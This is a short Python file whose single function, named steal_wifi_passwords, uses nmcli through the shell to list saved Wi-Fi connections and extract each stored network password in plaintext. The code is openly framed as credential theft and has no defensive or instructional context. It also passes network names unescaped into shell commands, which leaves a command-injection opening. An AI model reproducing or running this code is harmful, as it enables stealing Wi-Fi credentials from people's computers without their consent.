import subprocess

def steal_wifi_passwords():
    passwords = []
    try:
        networks = subprocess.check_output("nmcli -t -f NAME connection show", shell=True).decode().split('\n')
        for network in networks:
            if network.strip():
                try:
                    cmd = f"nmcli -s connection show '{network}' | grep '802-11-wireless-security.psk'"
                    result = subprocess.check_output(cmd, shell=True).decode()
                    password = result.split(':')[-1].strip()
                    passwords.append(f"{network}: {password}")
                except:
                    pass
    except:
        pass
    return passwords